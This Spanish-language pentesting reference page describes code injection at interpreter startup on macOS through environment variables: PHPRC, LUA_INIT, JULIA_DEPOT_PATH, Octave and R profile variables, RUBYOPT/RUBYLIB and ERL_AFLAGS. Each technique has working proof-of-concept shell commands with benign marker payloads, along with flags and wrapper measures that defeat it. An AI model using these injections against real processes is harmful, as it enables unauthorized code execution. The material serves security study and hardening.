# Inyección durante el inicio de intérpretes de macOS mediante variables de entorno

{{#include ../../../banners/hacktricks-training.md}}

Estas técnicas específicas de cada entorno de ejecución usan variables de entorno heredadas para seleccionar la configuración de inicio, precargar código o proporcionar flags de VM antes de la carga de trabajo prevista. Algunas variantes se basan en archivos; Lua y Erlang también permiten ejecutar código en línea.

## Configuración de inicio de PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` y `auto_prepend_file`

PHP CLI y CGI leen la configuración en cada invocación. `PHPRC` puede seleccionar un archivo `php.ini` legible por el atacante, mientras que `PHP_INI_SCAN_DIR` puede redirigir el directorio donde se buscan archivos `.ini` adicionales. La directiva `auto_prepend_file` hace que PHP analice un archivo antes del script solicitado, por lo que esta combinación permite ejecutar código durante el inicio.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Una alternativa es un directorio que contiene un archivo `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

La opción `-n` ignora `php.ini`; una ruta `-c` explícita y de confianza tiene prioridad sobre `PHPRC`. Recuerda que un SAPI de servidor de larga duración normalmente lee la configuración cuando se inicia el servidor web, mientras que CLI y CGI lo hacen en cada invocación.<sup>[[1]](#references)</sup>

## Código de inicio de Lua

### `LUA_INIT`

Antes de procesar las opciones de línea de comandos o el script de destino, el intérprete independiente de Lua ejecuta `LUA_INIT_<major>_<minor>` o, si la variable versionada no está definida, `LUA_INIT`. Un valor que comienza con `@` indica un archivo; cualquier otro valor se evalúa directamente como código Lua. Esto permite ejecutar código al inicio, tanto desde un archivo como sin archivos.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

El nombre exacto, incluida la versión, cambia según el intérprete; por ejemplo, `LUA_INIT_5_4`. `lua -E` ignora todas las variables de entorno, incluido el código de inicio y las rutas de módulos de Lua.

## Depot de inicio de Julia

### `JULIA_DEPOT_PATH` y `startup.jl`

Julia normalmente ejecuta `config/startup.jl` desde su primer depot al iniciarse. `JULIA_DEPOT_PATH` controla la lista de depots, así que apuntarlo a un árbol que el atacante pueda leer redirige el archivo de inicio que se carga automáticamente.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

El separador final es útil cuando la víctima todavía necesita sus paquetes habituales. `julia --startup-file=no` desactiva este archivo de inicio. Borra la variable antes de iniciar el proceso, ya que también controla los registros de paquetes, los entornos, las cachés y las ubicaciones de carga de código.

## Archivos de inicio de GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave ejecuta durante el inicio varios archivos que contienen comandos válidos de Octave. `OCTAVE_SITE_INITFILE` anula el archivo de inicio para todo el sitio y `OCTAVE_VERSION_INITFILE` anula el específico de la versión, lo que permite que cualquiera de las dos variables redirija la ejecución automática a un archivo legible por el atacante.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` solo omite archivos del usuario como `~/.octaverc`; **no** impide la sobrescritura del archivo del sitio descrita arriba. Usa `--no-site-file` para los archivos del sitio o `--norc` / `-f` para deshabilitar todos los archivos de inicio.<sup>[[7]](#references)</sup>

## Perfiles de inicio de R y carga de paquetes

### `R_PROFILE_USER` / `R_PROFILE`

Al iniciarse, R ejecuta archivos de perfil del sitio y del usuario que contienen código R. `R_PROFILE` selecciona el perfil del sitio y `R_PROFILE_USER` selecciona el perfil del usuario, lo que permite que un entorno heredado redirija cualquiera de las búsquedas a un archivo legible por el atacante.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` omite el perfil del usuario, `--no-site-file` omite el perfil del sitio y `--vanilla` incluye ambas protecciones. R procesa primero los archivos de entorno seleccionados por `R_ENVIRON` y `R_ENVIRON_USER`, pero esos archivos solo establecen variables; las variables de perfil son el mecanismo directo para ejecutar código arbitrario.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` y rutas de bibliotecas

R adjunta durante el inicio los paquetes separados por comas en `R_DEFAULT_PACKAGES`. `Rscript` da prioridad a `R_SCRIPT_DEFAULT_PACKAGES`. La combinación de cualquiera de estas variables con `R_LIBS`, `R_LIBS_USER` o `R_LIBS_SITE` puede hacer que R encuentre y cargue un paquete instalado controlado por un atacante; su hook `.onLoad` o `.onAttach` se ejecuta automáticamente.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Esto requiere un paquete R instalado y estructuralmente válido, no solo un archivo `.R` suelto. `--vanilla` no elimina las variables heredadas directamente, por lo que un wrapper de confianza debe desestablecer o reemplazar las variables de paquetes predeterminados y rutas de bibliotecas, además de deshabilitar los archivos de perfil.

## Opciones del cargador de Ruby

### RUBYOPT

Ruby analiza los switches de línea de comandos admitidos de la variable de entorno `RUBYOPT` antes de ejecutar un script. Ruby rechaza la ejecución de código mediante `-e` en `RUBYOPT`, pero `-I` puede anteponer un directorio de búsqueda de bibliotecas y `-r` puede requerir una biblioteca. Por lo tanto, se puede hacer que un proceso que inicia Ruby con variables de entorno controladas por un atacante cargue código Ruby controlado por el atacante.<sup>[[10]](#references)</sup>

Crea `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Crea un script benigno de Ruby, como `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Ejecútalo con un valor controlado de `RUBYOPT`:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Para deshabilitar este comportamiento, pasa `--disable=rubyopt` (o `--disable-rubyopt`) **antes** del nombre del script:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Una opción escrita después de `hello.rb` se pasa al script en `ARGV`; no desactiva el procesamiento previo de `RUBYOPT` por parte de Ruby.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

En lugar de anteponer el directorio de carga con `-I` dentro de `RUBYOPT`, la variable de entorno independiente `RUBYLIB` añade directorios a `$LOAD_PATH` de Ruby. Combinada con `RUBYOPT=-r<module>`, carga código del atacante sin necesidad de `-I` en `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Indicadores de la VM de Erlang y Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` y `ERL_ZFLAGS`

El lanzador `erl` añade `ERL_AFLAGS` al principio de su línea de comandos y `ERL_FLAGS` / `ERL_ZFLAGS` al final. Como `-eval` evalúa una expresión de Erlang durante la inicialización de la VM, estas variables pueden permitir la ejecución de código sin archivos antes de la carga de trabajo prevista.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix y muchas versiones de Elixir inician en última instancia la VM de Erlang y pueden heredar estos flags. Confirma el wrapper exacto de la versión: puede reconstruir o depurar los argumentos de la VM, mientras que algunas herramientas admiten explícitamente `ERL_AFLAGS`, `ERL_ZFLAGS` o `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

A diferencia de la mayoría de las técnicas basadas en archivos, el payload de `-eval` no necesita ningún archivo controlado por el atacante. Un wrapper de confianza debería eliminar las tres variables de flags de Erlang (y `ELIXIR_ERL_OPTIONS` para Elixir) antes de iniciar el runtime; no intentes permitir flags individuales de la VM a menos que conozcas por completo el parser y el orden de procesamiento.

## References

- [1] [Archivo de configuración de PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Intérprete independiente de Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interfaz de línea de comandos de Julia: archivo de inicio](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variables de entorno de Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Archivos de inicio de GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opciones de línea de comandos de GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Inicialización al iniciar una sesión de R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Instalación y administración de R: paquetes complementarios](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Documentación de Ruby: opciones de línea de comandos de Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Comando `erl` y variables de entorno](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Versiones de Elixir y opciones de entorno de la VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
